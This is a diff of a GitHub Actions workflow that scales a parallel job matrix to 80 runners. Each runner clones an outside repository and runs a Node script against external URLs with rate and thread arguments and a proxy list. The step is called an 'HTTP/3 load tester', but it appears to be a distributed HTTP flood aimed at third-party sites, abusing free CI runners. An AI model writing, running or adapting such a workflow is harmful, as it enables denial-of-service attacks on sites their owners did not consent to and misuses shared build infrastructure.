@@ -12,8 +12,9 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 100
+      fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]
     
     steps:
       - name: Checkout code
@@ -35,15 +36,23 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install net chalk hpack.js hpack colors puppeteer-real-browser
+        run: |
+          npm install net chalk hpack.js hpack colors
+
       
       
       - name: Run HTTP/3 load tester (if Python script exists)
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node m.js https://investorbit.live/FJ4jyqsf 200 3 3 3
+          node kl.js GET https://rapidis.gay/6901966783-141cda01-b741-4997-89f1-f1a304e14567 300 4 120 proxy.txt 
+          
+          
+          
+
+          
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
-          TOTAL_INSTANCES: 50
+          TOTAL_INSTANCES: 80
           RUNNER_OS: ubuntu
+
